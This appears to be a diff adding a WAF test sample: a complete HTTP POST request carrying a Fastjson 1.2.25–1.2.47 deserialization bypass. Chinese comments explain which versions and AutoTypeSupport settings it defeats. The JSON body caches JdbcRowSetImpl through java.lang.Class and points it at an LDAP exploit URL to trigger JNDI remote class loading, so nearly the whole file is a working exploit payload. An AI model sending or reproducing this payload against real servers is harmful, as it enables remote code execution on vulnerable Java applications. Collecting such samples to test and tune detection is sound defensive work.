@@ -1,0 +1,23 @@
+# Fastjson反序列化(v1.2.25-v1.2.47)补丁绕过
+# 1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；
+# 1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；
+# 通过json内置绕过安全补丁。
+POST /?acid=80002143&bid=hd_tag_m8mv257m HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv257m
+RM-PRO-Token: e3f8ef6020a1c4087b40fc6f6db9f6c3
+RM-PRO-Time: 1742808448194
+User-Agent: curl/7.83.1
+Content-Type: application/json
+
+{
+    "a":{
+        "@type":"java.lang.Class",
+        "val":"com.sun.rowset.JdbcRowSetImpl"
+    },
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"ldap://localhost:1389/Exploit",
+        "autoCommit":true
+    }
+}
